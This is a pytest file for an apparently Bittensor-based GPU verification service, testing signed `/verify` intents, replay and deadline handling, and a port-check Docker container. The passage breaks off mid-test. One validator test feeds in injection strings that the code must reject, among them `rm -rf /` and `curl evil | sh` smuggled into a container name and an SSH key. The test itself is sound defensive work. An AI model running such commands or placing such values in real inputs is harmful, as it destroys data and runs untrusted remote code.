"""liumd phase 1: `POST /verify` — one validator-signed intent, the suite run locally, one result.

Fake GPU: the matmul and VerifyX scripts are replaced by small Python files that print what the
real ones print (`RESULT_JSON: …`, a cipher line) after an optional sleep, so parallelism and the
deadline are measured for real. Fake docker/ports: the mocked docker client returns a container
publishing one host port of the renting range.
"""

from __future__ import annotations

import asyncio
import json
import secrets
import sys
import textwrap
import threading
import time
from types import SimpleNamespace
from unittest.mock import MagicMock

import bittensor
import pytest
import services.local_verify_service as lvs
from fastapi import FastAPI
from fastapi.testclient import TestClient
from middlewares.miner import MinerMiddleware
from payloads.verify import (
    CAPABILITY,
    DIND_CAPABILITY,
    SCHEMA,
    DeviceChallenge,
    DindData,
    DockerFacts,
    InspectorFacts,
    DindStep,
    MatmulStep,
    PortFacts,
    StepResult,
    VerifyIntentBody,
    VerifyResult,
    VerifySteps,
    VerifyXData,
    VerifyXStep,
)
from routes.apis import apis_router
from services.local_verify_service import (
    BusyError,
    LocalVerifyService,
    NonceCache,
    canonical_intent_message,
    check_intent_target,
    check_intent_window,
)

from core.config import settings
from routes import apis as apis_module

EXECUTOR_UUID = "exec-0001"


def _loop_thread_id() -> int:
    """The thread asyncio.run is on in these tests (the main thread)."""
    return threading.main_thread().ident


def _validator_module(name: str):
    """Load one of the validator's leaf modules by path (no validator package on this side)."""
    import importlib.util
    from pathlib import Path

    path = Path(__file__).resolve().parents[2] / "validators" / "src" / "services" / f"{name}.py"
    spec = importlib.util.spec_from_file_location(f"validator_{name}", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module

FAKE_MATMUL = textwrap.dedent(
    """
    import argparse, json, os, sys, time
    p = argparse.ArgumentParser()
    for name in ("--dim_n", "--dim_k", "--seed", "--cipher_text"):
        p.add_argument(name)
    a = p.parse_args()
    time.sleep(float(os.environ.get("FAKE_SLEEP", "0")))
    print("UUID:  fake-uuid")
    print("RESULT_JSON: " + json.dumps({"uuid": "fake-uuid", "metrics": {"tflops": 1.0},
          "sealed": "cafe" + a.cipher_text, "seed": a.seed,
          "device": os.environ.get("CUDA_VISIBLE_DEVICES")}))
    sys.exit(int(os.environ.get("FAKE_EXIT", "0")))
    """
)

FAKE_VERIFYX = textwrap.dedent(
    """
    import argparse, os, time
    p = argparse.ArgumentParser()
    p.add_argument("--seed"); p.add_argument("--cipher_text")
    a = p.parse_args()
    time.sleep(float(os.environ.get("FAKE_SLEEP", "0")))
    print(("ab" * 40) + a.cipher_text)
    """
)


@pytest.fixture(scope="module")
def validator_keypair():
    return bittensor.Keypair.create_from_uri("//LiumTestValidator")


@pytest.fixture()
def fake_scripts(tmp_path, monkeypatch):
    matmul = tmp_path / "decrypt_challenge.py"
    matmul.write_text(FAKE_MATMUL)
    verifyx = tmp_path / "verifyx_executor.py"
    verifyx.write_text(FAKE_VERIFYX)
    monkeypatch.setattr(lvs, "MATMUL_SCRIPT", matmul)
    monkeypatch.setattr(lvs, "VERIFYX_SCRIPT", verifyx)
    monkeypatch.setattr(
        lvs, "LIBVERIFYX_PATH", str(verifyx)
    )  # any readable file: the digest rides along
    monkeypatch.setattr(lvs, "LIBINSPECTOR_PATH", str(matmul))
    monkeypatch.setattr(lvs, "INSPECTOR_SCRIPT", matmul)
    return tmp_path


@pytest.fixture()
def fake_docker():
    # conftest replaced the docker module with a MagicMock; give from_env() a client with one
    # running container that publishes host port 40001 and a sysbox runtime.
    container = SimpleNamespace(
        name="pod-1",
        status="running",
        attrs={"Config": {"Image": "img:1"}, "Created": "2026-09-09T00:00:00Z"},
        ports={"22/tcp": [{"HostIp": "0.0.0.0", "HostPort": "40001"}]},
    )
    client = MagicMock()
    client.info.return_value = {
        "ServerVersion": "27.0",
        "DockerRootDir": "/",
        "Runtimes": {"runc": {}, "sysbox-runc": {}},
        "DefaultRuntime": "runc",
    }
    client.containers.list.return_value = [container]
    sys.modules["docker"].from_env.return_value = client
    return client


def _service(**overrides) -> LocalVerifyService:
    kwargs = dict(
        executor_version="test",
        max_deadline_s=60,
        port_range="40000-40009",
        port_mappings=None,
        ssh_port=2200,
        python=sys.executable,
    )
    kwargs.update(overrides)
    return LocalVerifyService(**kwargs)


def _body(**overrides) -> VerifyIntentBody:
    now = int(time.time())
    fields = dict(
        nonce=secrets.token_hex(16),
        issued_at=now,
        expires_at=now + 120,
        executor_uuid=EXECUTOR_UUID,
        miner_hotkey=settings.MINER_HOTKEY_SS58_ADDRESS,
        deadline_s=60,
        parallel_gpu=False,
        steps=VerifySteps(
            matmul=MatmulStep(dim_n=1900, dim_k=2000000, seed=7, cipher_text="c0ffee"),
            verifyx=VerifyXStep(seed=9, cipher_text="deadbeef"),
            docker=True,
            ports=True,
            inspector=True,
        ),
    )
    fields.update(overrides)
    return VerifyIntentBody(**fields)


def _signed(body: VerifyIntentBody, keypair) -> dict:
    wire = body.model_dump(by_alias=True)
    wire["signature"] = "0x" + keypair.sign(canonical_intent_message(wire)).hex()
    return wire


# --- the service: fake GPU, fake docker -------------------------------------------------------


def test_all_steps_run_and_return_raw_evidence(fake_scripts, fake_docker):
    result = asyncio.run(_service().run(_body()))

    assert result.schema_id == SCHEMA
    assert result.executor_uuid == EXECUTOR_UUID
    assert result.signer == "none" and result.signature is None
    assert not result.deadline_hit
    assert {name: s.status for name, s in result.steps.items()} == {
        "matmul": "ok",
        "verifyx": "ok",
        "docker": "ok",
        "ports": "ok",
        "inspector": "ok",
    }

    matmul = result.steps["matmul"]
    # The same stdout the validator parses over SSH, with its digest as evidence.
    assert "RESULT_JSON:" in matmul.stdout and '"sealed": "cafec0ffee"' in matmul.stdout
    assert matmul.exit_status == 0
    assert matmul.stdout_sha256 == lvs._sha256_text(matmul.stdout)

    verifyx = result.steps["verifyx"]
    assert verifyx.stdout.strip().endswith("deadbeef")
    assert verifyx.data == VerifyXData(
        lib_sha256=lvs.sha256_of_file(str(fake_scripts / "verifyx_executor.py"))
    )

    docker = result.steps["docker"].data
    assert isinstance(docker, DockerFacts)
    assert docker.sysbox_runtime is True and docker.runtimes == ["runc", "sysbox-runc"]
    assert docker.containers[0].name == "pod-1"
    # phase 2: the host clock rides beside the containers' `created` (one clock for the age)
    assert isinstance(docker.now, int) and abs(docker.now - time.time()) < 60
    assert docker.disk.total_bytes > 0

    ports = result.steps["ports"].data
    assert isinstance(ports, PortFacts)
    assert ports.configured == 10 and ports.published_by_docker == [40001] and ports.free_ports == 9

    inspector = result.steps["inspector"].data
    assert isinstance(inspector, InspectorFacts)
    assert inspector.lib_present and inspector.script_present and inspector.lib_sha256

    # The wire shape the validator reads is the typed models' field names, one round trip through JSON.
    wire = json.loads(result.model_dump_json(by_alias=True))
    assert wire["steps"]["ports"]["data"]["published_by_docker"] == [40001]
    assert set(wire["steps"]["docker"]["data"]) == set(DockerFacts.model_fields)
    assert VerifyResult.model_validate(wire).steps["docker"].data == docker


def test_gpu_steps_run_side_by_side_only_when_asked(fake_scripts, fake_docker, monkeypatch):
    monkeypatch.setenv("FAKE_SLEEP", "0.6")
    body = _body(steps=VerifySteps(matmul=_body().steps.matmul, verifyx=_body().steps.verifyx))

    serial = asyncio.run(_service().run(body))
    parallel = asyncio.run(_service().run(body.model_copy(update={"parallel_gpu": True})))

    assert serial.steps["matmul"].status == parallel.steps["matmul"].status == "ok"
    assert serial.elapsed_ms >= 1100, serial.elapsed_ms  # verifyx then matmul, the pipeline's order
    assert parallel.elapsed_ms < 1100, parallel.elapsed_ms


def test_deadline_returns_what_finished_and_marks_the_rest(fake_scripts, fake_docker, monkeypatch):
    monkeypatch.setenv("FAKE_SLEEP", "3")
    started = time.perf_counter()
    result = asyncio.run(_service(max_deadline_s=1).run(_body(parallel_gpu=True)))

    assert time.perf_counter() - started < 2.5
    assert result.deadline_hit
    assert (
        result.steps["matmul"].status == "timeout" and result.steps["verifyx"].status == "timeout"
    )
    # The fact steps do not wait for the GPU ones.
    assert result.steps["docker"].status == "ok" and result.steps["ports"].status == "ok"


def test_deadline_keeps_the_finished_gpu_sibling_when_run_side_by_side(
    fake_scripts, fake_docker, monkeypatch
):
    """parallel_gpu: VerifyX finishes at once, the matmul outlives the deadline. The finished
    step's evidence must come back `ok`; only the unfinished one is `timeout`."""
    slow_matmul = fake_scripts / "decrypt_challenge.py"
    slow_matmul.write_text(FAKE_MATMUL.replace('os.environ.get("FAKE_SLEEP", "0")', '"3"'))
    started = time.perf_counter()
    result = asyncio.run(_service(max_deadline_s=1).run(_body(parallel_gpu=True)))

    assert time.perf_counter() - started < 2.5
    assert result.deadline_hit
    assert result.steps["verifyx"].status == "ok", result.steps["verifyx"]
    assert ("ab" * 40) in result.steps["verifyx"].stdout
    assert result.steps["matmul"].status == "timeout"


def test_failed_script_is_evidence_not_an_exception(fake_scripts, fake_docker, monkeypatch):
    monkeypatch.setenv("FAKE_EXIT", "3")
    result = asyncio.run(_service().run(_body()))
    matmul = result.steps["matmul"]
    assert matmul.status == "failed" and matmul.exit_status == 3
    assert "RESULT_JSON:" in matmul.stdout  # what it printed before exiting is kept
    assert result.steps["verifyx"].status == "ok"


def test_all_cards_pins_one_run_per_device_with_its_own_challenge(fake_scripts, fake_docker):
    body = _body(
        steps=VerifySteps(
            matmul=MatmulStep(
                dim_n=1900,
                dim_k=2000000,
                seed=7,
                cipher_text="c0ffee",
                devices=[
                    DeviceChallenge(index=0, seed=70, cipher_text="card0"),
                    DeviceChallenge(index=1, seed=71, cipher_text="card1"),
                ],
            )
        )
    )
    result = asyncio.run(_service().run(body))
    cards = result.steps["matmul"].data.per_card
    assert [c.card_index for c in cards] == [0, 1]
    assert all(c.status == "ok" for c in cards)
    printed = [json.loads(c.stdout.splitlines()[-1].split("RESULT_JSON: ")[1]) for c in cards]
    assert [p["device"] for p in printed] == ["0", "1"]
    # Each card ran ITS challenge: the sealed output carries that card's cipher text and seed, not the step's.
    assert [p["sealed"] for p in printed] == ["cafecard0", "cafecard1"]
    assert [p["seed"] for p in printed] == ["70", "71"]


@pytest.mark.parametrize(
    "devices",
    [
        # two cards, one challenge: one real run could answer for both
        [DeviceChallenge(index=0, seed=1, cipher_text="same"), DeviceChallenge(index=1, seed=2, cipher_text="same")],
        # a card's challenge equal to the step's own
        [DeviceChallenge(index=0, seed=1, cipher_text="c")],
        # the same card twice
        [DeviceChallenge(index=0, seed=1, cipher_text="a"), DeviceChallenge(index=0, seed=2, cipher_text="b")],
    ],
)
def test_a_shared_or_repeated_card_challenge_is_refused(devices):
    with pytest.raises(ValueError):
        MatmulStep(dim_n=1, dim_k=1, seed=1, cipher_text="c", devices=devices)


def test_a_shared_card_challenge_is_a_422_on_the_route(client, validator_keypair):
    """The model_validator's refusal reaches the wire as a JSON 422 (its `ctx` carries a ValueError
    object that FastAPI cannot serialise by itself)."""
    body = _body().model_dump(by_alias=True)
    body["steps"] = {
        "matmul": {
            "dim_n": 1, "dim_k": 1, "seed": 1, "cipher_text": "c",
            "devices": [
                {"index": 0, "seed": 1, "cipher_text": "same"},
                {"index": 1, "seed": 2, "cipher_text": "same"},
            ],
        }
    }
    body["signature"] = "0x" + validator_keypair.sign(canonical_intent_message(body)).hex()
    response = client.post("/verify", json=body)
    assert response.status_code == 422
    assert "own cipher_text" in json.dumps(response.json())


def test_no_configured_ports_means_the_validators_default_range(fake_docker):
    """Both settings unset: the validator counts 20000–65535 (port_utils.DEFAULT_PORT_RANGE), so
    the facts must count the same, not zero."""
    port_utils = _validator_module("port_utils")  # the validator's own definition, same repo
    assert lvs.DEFAULT_PORT_RANGE == port_utils.DEFAULT_PORT_RANGE
    assert lvs.parse_port_range(None, None) == port_utils.get_all_ports(None, None, 0)
    assert lvs.parse_port_range(None, None) == [(p, p) for p in range(20000, 65536)]
    assert lvs.parse_port_range("", "") == [(p, p) for p in range(20000, 65536)]
    facts = lvs._port_facts(None, None, ssh_port=22)
    assert facts.configured == 65536 - 20000 and facts.sampled == lvs.PORT_SAMPLE_MAX
    assert lvs.parse_port_range("40000-40001", None) == [(40000, 40000), (40001, 40001)]


def test_the_verifyx_library_is_hashed_off_the_event_loop(fake_scripts, fake_docker, monkeypatch):
    on_loop: list[bool] = []
    pool_thread: list[str] = []
    real = lvs.sha256_of_file

    def observed(path):
        on_loop.append(_loop_thread_id() == threading.get_ident())
        pool_thread.append(threading.current_thread().name)
        return real(path)

    monkeypatch.setattr(lvs, "sha256_of_file", observed)
    result = asyncio.run(_service().run(_body(steps=VerifySteps(verifyx=VerifyXStep(seed=1, cipher_text="d")))))
    assert result.steps["verifyx"].data.lib_sha256 == real(str(fake_scripts / "verifyx_executor.py"))
    assert on_loop == [False]
    assert pool_thread[0].startswith("local-verify-facts")  # the facts pool, not asyncio's default


def test_a_deadline_during_the_library_digest_does_not_start_the_next_gpu_step(
    fake_scripts, fake_docker, monkeypatch, tmp_path
):
    """Serial order, VerifyX instant, its library digest 2 s, the matmul 3 s, deadline 1 s: the
    cancellation lands in the digest await. It must end the GPU group there — the matmul never
    starts and `run` returns at the deadline. (A step that swallowed the cancellation would run the
    matmul afterwards and hold the answer for it: ≥ 5 s and a matmul that ran.)"""
    mark = tmp_path / "matmul_ran"
    slow_matmul = fake_scripts / "decrypt_challenge.py"
    slow_matmul.write_text(
        FAKE_MATMUL.replace('time.sleep(float(os.environ.get("FAKE_SLEEP", "0")))', f'open({str(mark)!r}, "w").close(); time.sleep(3)')
    )
    real = lvs.sha256_of_file

    def slow_digest(path):
        time.sleep(2)
        return real(path)

    monkeypatch.setattr(lvs, "sha256_of_file", slow_digest)
    started = time.perf_counter()
    result = asyncio.run(_service(max_deadline_s=1).run(_body()))  # serial: verifyx, then matmul
    assert time.perf_counter() - started < 2.5
    assert result.deadline_hit
    assert result.steps["verifyx"].status == "timeout" and result.steps["matmul"].status == "timeout"
    assert not mark.exists()  # the matmul never started


def test_a_slow_digest_neither_blocks_the_loop_nor_loses_the_run(fake_scripts, fake_docker, monkeypatch):
    """The digest starts before the script and is awaited after it: a slow one (here 0.4 s, the
    script instant) delays the answer by its remainder only and the run keeps its output."""
    real = lvs.sha256_of_file

    def slow(path):
        time.sleep(0.4)
        return real(path)

    monkeypatch.setattr(lvs, "sha256_of_file", slow)
    started = time.perf_counter()
    result = asyncio.run(_service().run(_body(steps=VerifySteps(verifyx=VerifyXStep(seed=1, cipher_text="d")))))
    assert result.steps["verifyx"].status == "ok" and result.steps["verifyx"].data.lib_sha256 == real(
        str(fake_scripts / "verifyx_executor.py")
    )
    assert time.perf_counter() - started < 3


def test_steps_not_asked_for_are_skipped(fake_scripts, fake_docker):
    result = asyncio.run(_service().run(_body(steps=VerifySteps(docker=True))))
    assert result.steps["docker"].status == "ok"
    assert {n for n, s in result.steps.items() if s.status == "skipped"} == {
        "matmul",
        "verifyx",
        "ports",
        "inspector",
    }


def test_second_concurrent_intent_is_refused_as_busy(fake_scripts, fake_docker, monkeypatch):
    monkeypatch.setenv("FAKE_SLEEP", "0.5")
    service = _service()

    async def two_at_once():
        first = asyncio.ensure_future(service.run(_body()))
        await asyncio.sleep(0.05)
        with pytest.raises(BusyError):
            await service.run(_body())
        return await first

    assert asyncio.run(two_at_once()).steps["matmul"].status == "ok"


def test_docker_failure_is_one_failed_step(fake_scripts, fake_docker):
    fake_docker.info.side_effect = RuntimeError("daemon down")
    result = asyncio.run(_service().run(_body(steps=VerifySteps(docker=True, ports=True))))
    assert (
        result.steps["docker"].status == "failed" and "daemon down" in result.steps["docker"].error
    )
    assert result.steps["ports"].status == "ok"


# --- intent hygiene -----------------------------------------------------------------------------


def test_canonical_message_ignores_key_order_and_signature():
    a = {"nonce": "n", "steps": {"docker": True, "ports": False}, "issued_at": 1, "signature": "x"}
    b = {"signature": "y", "issued_at": 1, "steps": {"ports": False, "docker": True}, "nonce": "n"}
    assert canonical_intent_message(a) == canonical_intent_message(b)
    assert "signature" not in canonical_intent_message(a)


def test_intent_window():
    now = 1_000_000
    assert check_intent_window(_body(issued_at=now, expires_at=now + 120), now, 120) is None
    assert (
        check_intent_window(_body(issued_at=now, expires_at=now - 1), now, 120) == "intent expired"
    )
    assert (
        check_intent_window(_body(issued_at=now - 121, expires_at=now + 120), now, 120)
        == "issued_at outside the accepted window"
    )
    assert (
        check_intent_window(_body(issued_at=now, expires_at=now + 3600), now, 120)
        == "expiry too far from issued_at"
    )


def test_nonce_cache_refuses_replay_until_expiry():
    cache = NonceCache()
    assert cache.claim("a", expires_at=200, now=100)
    assert not cache.claim("a", expires_at=200, now=150)
    assert cache.claim("a", expires_at=400, now=201)  # expired entries are forgotten


# --- the route: auth, flag, replay -----------------------------------------------------------


@pytest.fixture()
def client(validator_keypair, monkeypatch, fake_scripts, fake_docker):
    monkeypatch.setattr("dependencies.auth.VALIDATOR_HOTKEY_SS58", validator_keypair.ss58_address)
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_ENABLED", True)
    monkeypatch.setattr(settings, "RENTING_PORT_RANGE", "40000-40009")
    monkeypatch.setattr(apis_module, "_local_verify_service", None)
    monkeypatch.setattr(apis_module, "_local_verify_nonces", NonceCache())
    app = FastAPI()
    app.add_middleware(MinerMiddleware)
    app.include_router(apis_router)
    return TestClient(app)


def test_version_advertises_the_capability_only_when_enabled(client, monkeypatch):
    assert client.get("/version").json()["capabilities"] == [CAPABILITY]
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_ENABLED", False)
    assert client.get("/version").json()["capabilities"] == []


def test_flag_off_is_404(client, validator_keypair, monkeypatch):
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_ENABLED", False)
    assert client.post("/verify", json=_signed(_body(), validator_keypair)).status_code == 404


def test_signed_intent_runs_the_suite(client, validator_keypair):
    response = client.post("/verify", json=_signed(_body(), validator_keypair))
    assert response.status_code == 200, response.text
    result = response.json()
    assert result["schema"] == SCHEMA and result["executor_uuid"] == EXECUTOR_UUID
    assert (
        result["steps"]["matmul"]["status"] == "ok"
        and "RESULT_JSON:" in result["steps"]["matmul"]["stdout"]
    )
    assert result["steps"]["ports"]["data"]["published_by_docker"] == [40001]
    assert result["signer"] == "none"


def test_wrong_key_or_tampered_field_is_401(client, validator_keypair):
    stranger = bittensor.Keypair.create_from_uri("//Stranger")
    assert client.post("/verify", json=_signed(_body(), stranger)).status_code == 401

    tampered = _signed(_body(), validator_keypair)
    tampered["steps"]["matmul"]["cipher_text"] = "ffff"
    assert client.post("/verify", json=tampered).status_code == 401

    swapped_uuid = _signed(_body(), validator_keypair)
    swapped_uuid["executor_uuid"] = "someone-else"
    assert client.post("/verify", json=swapped_uuid).status_code == 401


def test_an_intent_for_another_miners_executor_is_401_and_not_burnt(client, validator_keypair):
    """Regression: a validator intent captured on provider A's wire and relayed to provider B's
    executor (same validator signature, B's flag on) must not run B's GPU suite — B would answer
    the real validator 409 busy meanwhile. The executor knows only its miner, so the signed
    `miner_hotkey` is what binds the intent; the portal hotkey every executor trusts does not."""
    other_miner = bittensor.Keypair.create_from_uri("//OtherMiner").ss58_address
    relayed = client.post("/verify", json=_signed(_body(miner_hotkey=other_miner), validator_keypair))
    assert relayed.status_code == 401 and "another miner" in relayed.text
    portal = client.post(
        "/verify", json=_signed(_body(miner_hotkey=settings.DEFAULT_MINER_HOTKEY), validator_keypair)
    )
    assert portal.status_code == 401
    assert check_intent_target(_body(), settings.MINER_HOTKEY_SS58_ADDRESS) is None
    # refused before the nonce is claimed: the same nonce, correctly addressed, still runs
    body = _body(steps=VerifySteps(inspector=True))
    foreign = _signed(body.model_copy(update={"miner_hotkey": other_miner}), validator_keypair)
    assert client.post("/verify", json=foreign).status_code == 401
    assert client.post("/verify", json=_signed(body, validator_keypair)).status_code == 200


def test_replayed_nonce_is_refused(client, validator_keypair):
    intent = _signed(_body(steps=VerifySteps(inspector=True)), validator_keypair)
    assert client.post("/verify", json=intent).status_code == 200
    replay = client.post("/verify", json=intent)
    assert replay.status_code == 409 and "nonce" in replay.text


def test_busy_is_409_and_does_not_burn_the_nonce(client, validator_keypair, monkeypatch):
    """A second intent while one runs is refused as busy WITHOUT claiming its nonce, so the same
    signed intent is accepted once the executor is free (the validator need not re-sign)."""
    monkeypatch.setenv("FAKE_SLEEP", "0.8")
    first = _signed(_body(steps=VerifySteps(verifyx=_body().steps.verifyx)), validator_keypair)
    second = _signed(_body(steps=VerifySteps(inspector=True)), validator_keypair)
    with client:  # the TestClient's own loop, so the two requests share one service instance

        async def scenario():
            loop = asyncio.get_running_loop()
            running = loop.run_in_executor(None, lambda: client.post("/verify", json=first))
            await asyncio.sleep(0.2)
            while_busy = await loop.run_in_executor(
                None, lambda: client.post("/verify", json=second)
            )
            return await running, while_busy

        done, while_busy = client.portal.call(scenario)
    assert done.status_code == 200
    assert while_busy.status_code == 409 and "already running" in while_busy.text
    after = client.post("/verify", json=second)
    assert after.status_code == 200, after.text


def test_expired_or_skewed_intent_is_401(client, validator_keypair):
    now = int(time.time())
    expired = _signed(_body(issued_at=now - 300, expires_at=now - 10), validator_keypair)
    assert client.post("/verify", json=expired).status_code == 401
    skewed = _signed(_body(issued_at=now + 600, expires_at=now + 700), validator_keypair)
    assert client.post("/verify", json=skewed).status_code == 401


def test_malformed_intent_is_422_before_any_signature_check(client, validator_keypair):
    assert client.post("/verify", json={"nonce": "short"}).status_code == 422
    assert client.post("/verify", json=[1, 2]).status_code == 422
    # Another schema version is refused, not run under v1 semantics — even correctly signed.
    other_schema = _body().model_dump(by_alias=True)
    other_schema["schema"] = "lium.local_verify/2"
    other_schema["signature"] = (
        "0x" + validator_keypair.sign(canonical_intent_message(other_schema)).hex()
    )
    assert client.post("/verify", json=other_schema).status_code == 422
    # The matmul fan-out is bounded: more devices than any host has, or a negative index, is 422.
    with pytest.raises(ValueError):
        MatmulStep(
            dim_n=1, dim_k=1, seed=1, cipher_text="c",
            devices=[DeviceChallenge(index=i, seed=i, cipher_text=f"card{i}") for i in range(65)],
        )
    with pytest.raises(ValueError):
        DeviceChallenge(index=-1, seed=1, cipher_text="x")


def test_unknown_top_level_field_is_422_even_when_signed(client, validator_keypair):
    """Regression: `extra="ignore"` on the wire models would accept `{"steps": …, "priority": 1}`,
    run the suite (200) and silently drop the field — while the Rust liumd (`deny_unknown_fields`)
    refuses the same document. Both sides refuse, so the schema can be pinned."""
    intent = _body().model_dump(by_alias=True)
    intent["priority"] = 1
    intent["signature"] = "0x" + validator_keypair.sign(canonical_intent_message(intent)).hex()
    response = client.post("/verify", json=intent)
    assert response.status_code == 422, response.text
    assert "priority" in response.text
    # A nested unknown field is refused the same way; the intent's own fields alone are accepted.
    nested = _signed(_body(), validator_keypair)
    nested["steps"]["matmul"]["dim_m"] = 4
    nested["signature"] = "0x" + validator_keypair.sign(canonical_intent_message(nested)).hex()
    assert client.post("/verify", json=nested).status_code == 422
    assert client.post("/verify", json=_signed(_body(), validator_keypair)).status_code == 200


def test_canonical_message_is_the_shared_datura_definition():
    """One definition for signer and verifier (the validator client imports the same function)."""
    from datura.requests.validator_requests import (
        LOCAL_VERIFY_CAPABILITY,
        LOCAL_VERIFY_SCHEMA,
        local_verify_signing_blob,
    )

    assert canonical_intent_message is local_verify_signing_blob
    assert SCHEMA == LOCAL_VERIFY_SCHEMA and CAPABILITY == LOCAL_VERIFY_CAPABILITY


# --- phase 2c: the port-check DinD container started from the intent ---------------------------


PUBKEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQ2b7l3kK5f5iFq3p0d9m4xX3oL0mYq6x2Ck5N4z1aB validator"


def _dind(**overrides) -> DindStep:
    fields = dict(name="container_hotkey_40003", port=40003, public_key=PUBKEY, sysbox=True)
    fields.update(overrides)
    return DindStep(**fields)


def test_dind_step_is_bounded_on_the_wire():
    for bad in (
        dict(name="pod_x_1"),  # not the port check's prefix
        dict(name="container_a; rm -rf /"),
        dict(name="container_" + "a" * 101),
        dict(port=0),
        dict(port=70000),
        dict(public_key="ssh-ed25519 AAAA; curl evil | sh"),
        dict(public_key="ssh-dss AAAA"),
        dict(public_key="ssh-rsa " + "A" * 1000),
    ):
        with pytest.raises(Exception):
            _dind(**bad)


def test_dind_step_accepts_the_validators_real_key_line_and_a_real_hotkey_name():
    """The bounds come from datura, shared with the validator's own pre-send check; the key line
    the validator mints (cryptography's OpenSSH ed25519 encoding) and `container_<ss58>_<port>`
    must be accepted here, or the whole intent is a 422."""
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import ed25519
    from datura.requests.validator_requests import LOCAL_VERIFY_DIND_NAME_PATTERN, LOCAL_VERIFY_DIND_PUBLIC_KEY_PATTERN

    line = ed25519.Ed25519PrivateKey.generate().public_key().public_bytes(
        encoding=serialization.Encoding.OpenSSH, format=serialization.PublicFormat.OpenSSH
    ).decode().strip()
    hotkey = bittensor.Keypair.create_from_uri("//Alice").ss58_address
    step = DindStep(name=f"container_{hotkey}_65535", port=65535, public_key=line)
    assert step.public_key == line
    patterns = {
        field: next(m.pattern for m in DindStep.model_fields[field].metadata if hasattr(m, "pattern"))
        for field in ("name", "public_key")
    }
    assert patterns == {"name": LOCAL_VERIFY_DIND_NAME_PATTERN, "public_key": LOCAL_VERIFY_DIND_PUBLIC_KEY_PATTERN}


def test_dind_argv_is_the_validators_run_dind_byte_for_byte_as_argv():
    argv = lvs.dind_argv(_dind(), 40003)
    assert argv[:3] == ["/usr/bin/docker", "run", "-d"]
    assert "--runtime=sysbox-runc" in argv
    assert argv[argv.index("--name") + 1] == "container_hotkey_40003"
    assert argv[argv.index("-p") + 1] == "40003:22"
    assert lvs.DIND_IMAGE in argv
    assert argv[-3:-1] == ["sh", "-c"] and PUBKEY in argv[-1] and "service ssh start" in argv[-1]
    assert "--runtime=sysbox-runc" not in lvs.dind_argv(_dind(sysbox=False), 40003)


def test_dind_runs_only_on_one_of_this_executors_rental_ports(monkeypatch):
    runs: list[list[str]] = []

    async def fake_run_script(argv, *, timeout, env=None):
        runs.append(argv)
        return StepResult(status="ok", exit_status=0, stdout="cid\n")

    removed: list[str] = []

    async def fake_remove(name, container_id=None, run_token=None):
        removed.append(name)

    monkeypatch.setattr(lvs, "run_script", fake_run_script)
    monkeypatch.setattr(lvs, "_remove_dind_orphan", fake_remove)
    monkeypatch.setattr(lvs, "DIND_ORPHAN_TTL_SECONDS", 3600)
    pairs = lvs.parse_port_range("40000-40009", None)

    # outside the range, and — with sshd INSIDE the range — the sshd port itself
    for port, ssh_port in ((39999, 2200), (40010, 2200), (40005, 40005)):
        result = asyncio.run(lvs.run_dind(_dind(port=port), pairs, ssh_port))
        assert result.status == "failed" and "rental ports" in result.error, (port, ssh_port)
    assert runs == [] and removed == []

    result = asyncio.run(lvs.run_dind(_dind(port=40003), pairs, 2200))
    assert result.status == "ok"
    assert result.data == DindData(container_name="container_hotkey_40003", port=40003, publish_port=40003)
    assert len(runs) == 1 and runs[0][runs[0].index("-p") + 1] == "40003:22"
    lvs._dind_orphan_timers.pop("container_hotkey_40003").cancel()


def test_a_second_start_of_the_same_name_cancels_the_earlier_timer_and_each_removes_its_own_id(monkeypatch):
    """The name is deterministic and the verify cadence ≈ the TTL: the earlier cycle's timer must
    not fire on this cycle's fresh container. Cancelled on re-arm, and removal is by the container
    id `docker run -d` printed, never by the shared name."""
    cids = iter(["a" * 64, "b" * 64])

    async def fake_run_script(argv, *, timeout, env=None):
        return StepResult(status="ok", exit_status=0, stdout=next(cids) + "\n")

    removed: list[tuple[str, str | None]] = []

    async def fake_remove(name, container_id=None):
        removed.append((name, container_id))

    monkeypatch.setattr(lvs, "run_script", fake_run_script)
    monkeypatch.setattr(lvs, "_remove_dind_orphan", fake_remove)
    pairs = lvs.parse_port_range("40000-40009", None)

    async def scenario():
        await lvs.run_dind(_dind(), pairs, 2200)
        first = lvs._dind_orphan_timers["container_hotkey_40003"]
        await lvs.run_dind(_dind(), pairs, 2200)
        second = lvs._dind_orphan_timers["container_hotkey_40003"]
        assert first.cancelled() and not second.cancelled() and first is not second
        second._run()  # fire the surviving timer now
        await asyncio.sleep(0)
        second.cancel()
        return removed

    assert asyncio.run(scenario()) == [("container_hotkey_40003", "b" * 64)]
    lvs._dind_orphan_timers.pop("container_hotkey_40003", None)


def test_a_cancelled_docker_run_still_removes_the_container_it_may_have_made(monkeypatch):
    """The intent deadline cancels the step while `docker run -d` is in flight: the CLI is killed
    but the daemon may hold a container of this name, or create it a moment after the first rm
    found nothing — it is removed off the cancelled path, now and once more after the retry delay."""
    removed: list[str] = []

    async def hanging_run_script(argv, *, timeout, env=None):
        await asyncio.sleep(30)

    async def fake_remove(name, container_id=None, run_token=None):
        removed.append(name)

    monkeypatch.setattr(lvs, "run_script", hanging_run_script)
    monkeypatch.setattr(lvs, "_remove_dind_orphan", fake_remove)
    monkeypatch.setattr(lvs, "DIND_CANCELLED_RM_RETRY_SECONDS", 0.01)

    async def scenario():
        task = asyncio.create_task(lvs.run_dind(_dind(), lvs.parse_port_range("40000-40009", None), 2200))
        await asyncio.sleep(0.01)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task
        await asyncio.sleep(0.05)  # the removal task runs: now, and again after the retry delay

    asyncio.run(scenario())
    assert removed == ["container_hotkey_40003", "container_hotkey_40003"]
    assert "container_hotkey_40003" not in lvs._dind_orphan_timers  # no by-name timer is armed


def test_the_late_removals_target_this_calls_container_only_never_the_name(monkeypatch):
    """Regression: the delayed second removal ran `docker rm -fv <name>` after the answer had
    left; the validator, reading `started=False`, may by then have started ITS OWN container under
    that very name over SSH, and the retry killed the probe container. The `docker run` now carries
    a per-call label and both removals resolve that label to ids — the bare name is never removed."""
    seen: list[list[str]] = []
    argv_seen: list[list[str]] = []

    async def hanging_run_script(argv, *, timeout, env=None):
        argv_seen.append(argv)
        await asyncio.sleep(30)

